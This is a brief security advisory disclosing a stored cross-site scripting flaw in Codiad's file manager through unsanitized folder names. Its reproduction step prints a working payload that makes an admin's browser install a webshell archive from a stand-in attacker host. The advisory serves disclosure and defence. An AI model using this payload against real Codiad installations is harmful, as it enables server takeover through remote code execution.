## Summary
A Cross Site Scripting (XSS) vulnerability was found in Codiad. The vulnerability occurs due to improper sanitization of the folderâ€™s name, the `$path` variable in `components/filemanager/class.filemanager.php`.

## Product
Codiad from v1.7.8.

## Impact
An attacker could run arbitrary Javascript code on the users, chaining this vulnerability with another one, an RCE vulnerability could be achieved.

## Steps to reproduce
1. Login to codiad
2. Create a folder and name it with html element
3. The following example running on an admin will result in a webshell:```<img width=1 height=1 src=components/market/controller.php?action=install&type=&name=Manually&repo=http://evilWebSite/webshell/webshell.zip?a=>```

### Expected result:
The html element is running when viewing the folder name.

## Remediation
There is no fixed version of Codiad.
